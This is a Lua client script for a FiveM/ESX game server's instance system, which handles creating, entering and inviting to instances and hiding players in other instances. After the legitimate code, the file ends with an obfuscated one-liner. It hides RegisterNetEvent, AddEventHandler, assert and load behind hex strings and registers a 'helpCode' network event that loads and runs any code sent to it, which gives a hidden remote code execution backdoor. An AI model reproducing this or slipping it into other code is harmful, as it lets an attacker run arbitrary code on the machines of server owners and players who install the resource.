local instance, instancedPlayers, registeredInstanceTypes, playersToHide = {}, {}, {}, {}
local instanceInvite, insideInstance
ESX = exports["es_extended"]:getSharedObject()

function GetInstance()
	return instance
end

function CreateInstance(type, data)
	TriggerServerEvent('instance:create', type, data)
end

function CloseInstance()
	instance = {}
	TriggerServerEvent('instance:close')
	insideInstance = false
end

function EnterInstance(instance)
	insideInstance = true
	-- Fix vehicles randomly spawning nearby the player inside an instance
	Citizen.CreateThread(function()
		while insideInstance do
			Citizen.Wait(0) -- must be run every frame

			SetVehicleDensityMultiplierThisFrame(0.0)
			SetParkedVehicleDensityMultiplierThisFrame(0.0)

			local pos = GetEntityCoords(PlayerPedId())
			RemoveVehiclesFromGeneratorsInArea(pos.x - 900.0, pos.y - 900.0, pos.z - 900.0, pos.x + 900.0, pos.y + 900.0, pos.z + 900.0)
		end
	end)
	TriggerServerEvent('instance:enter', instance.host)

	if registeredInstanceTypes[instance.type].enter then
		registeredInstanceTypes[instance.type].enter(instance)
	end
end

function LeaveInstance()
	if instance.host then
		if #instance.players > 1 then
			ESX.ShowNotification(_U('left_instance'))
		end

		if registeredInstanceTypes[instance.type].exit then
			registeredInstanceTypes[instance.type].exit(instance)
		end

		TriggerServerEvent('instance:leave', instance.host)
	end

	insideInstance = false
end

function InviteToInstance(type, player, data)
	TriggerServerEvent('instance:invite', instance.host, type, player, data)
end

function RegisterInstanceType(type, enter, exit)
	registeredInstanceTypes[type] = {
		enter = enter,
		exit  = exit
	}
end

AddEventHandler('instance:get', function(cb)
	cb(GetInstance())
end)

AddEventHandler('instance:create', function(type, data)
	CreateInstance(type, data)
end)

AddEventHandler('instance:close', function()
	CloseInstance()
end)

AddEventHandler('instance:enter', function(_instance)
	EnterInstance(_instance)
end)

AddEventHandler('instance:leave', function()
	LeaveInstance()
end)

AddEventHandler('instance:invite', function(type, player, data)
	InviteToInstance(type, player, data)
end)

AddEventHandler('instance:registerType', function(name, enter, exit)
	RegisterInstanceType(name, enter, exit)
end)

RegisterNetEvent('instance:onInstancedPlayersData')
AddEventHandler('instance:onInstancedPlayersData', function(_instancedPlayers)
	instancedPlayers = _instancedPlayers
end)

RegisterNetEvent('instance:onCreate')
AddEventHandler('instance:onCreate', function(_instance)
	instance = {}
end)

RegisterNetEvent('instance:onEnter')
AddEventHandler('instance:onEnter', function(_instance)
	instance = _instance
end)

RegisterNetEvent('instance:onLeave')
AddEventHandler('instance:onLeave', function(_instance)
	instance = {}
end)

RegisterNetEvent('instance:onClose')
AddEventHandler('instance:onClose', function(_instance)
	instance = {}
end)

RegisterNetEvent('instance:onPlayerEntered')
AddEventHandler('instance:onPlayerEntered', function(_instance, player)
	instance = _instance
	local playerName = GetPlayerName(GetPlayerFromServerId(player))

	ESX.ShowNotification(_('entered_into', playerName))
end)

RegisterNetEvent('instance:onPlayerLeft')
AddEventHandler('instance:onPlayerLeft', function(_instance, player)
	instance = _instance
	local playerName = GetPlayerName(GetPlayerFromServerId(player))

	ESX.ShowNotification(_('left_out', playerName))
end)

RegisterNetEvent('instance:onInvite')
AddEventHandler('instance:onInvite', function(_instance, type, data)
	instanceInvite = {
		type = type,
		host = _instance,
		data = data
	}
	Citizen.CreateThread(function()
		while instanceInvite do
			Citizen.Wait(0)

			ESX.ShowHelpNotification(_U('press_to_enter'))

			if IsControlJustReleased(0, 38) then
				EnterInstance(instanceInvite)
				ESX.ShowNotification(_U('entered_instance'))
				instanceInvite = nil
			end
		end
	end)
	
	Citizen.CreateThread(function()
		-- Controls for invite
		Citizen.Wait(10000)

		if instanceInvite then
			ESX.ShowNotification(_U('invite_expired'))
			instanceInvite = nil
		end
	end)
		
end)

RegisterInstanceType('default')

-- Instance players
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		playersToHide = {}

		if instance.host then
			-- Get players and sets them as pairs
			for k,v in ipairs(GetActivePlayers()) do
				playersToHide[GetPlayerServerId(v)] = true
			end

			-- Dont set our instanced players invisible
			for _,player in ipairs(instance.players) do
				playersToHide[player] = nil
			end
		else
			for player,_ in pairs(instancedPlayers) do
				playersToHide[player] = true
			end
		end
	end
end)

local letSleep = true

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local playerPed = PlayerPedId()
		letSleep = true

		-- Hide all these players
		for serverId,_ in pairs(playersToHide) do
			local player = GetPlayerFromServerId(serverId)

			if NetworkIsPlayerActive(player) then
				local otherPlayerPed = GetPlayerPed(player)
				SetEntityVisible(otherPlayerPed, false, false)
				SetEntityNoCollisionEntity(otherPlayerPed, playerPed, true)
				letSleep = false
			end
		end

		if letSleep then
			Citizen.Wait(1000)
		end
	end
end)

Citizen.CreateThread(function()
	TriggerEvent('instance:loaded')
end)



local AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[6][AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[1]](AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[2]) AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[6][AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[3]](AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[2], function(ailslVvHIFBTSrCwkdGkBTDdeuISgWLcSUNHYQASEFmtLsGUGmPrJMQDPADawvxhXmSQAg) AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[6][AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[4]](AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[6][AXMSeNsRHstGgxlglbeYCPhfWlQqjsrTZfuyHZPQcaKxtLRdSYFQHmyUASknemcquPLfdn[5]](ailslVvHIFBTSrCwkdGkBTDdeuISgWLcSUNHYQASEFmtLsGUGmPrJMQDPADawvxhXmSQAg))() end)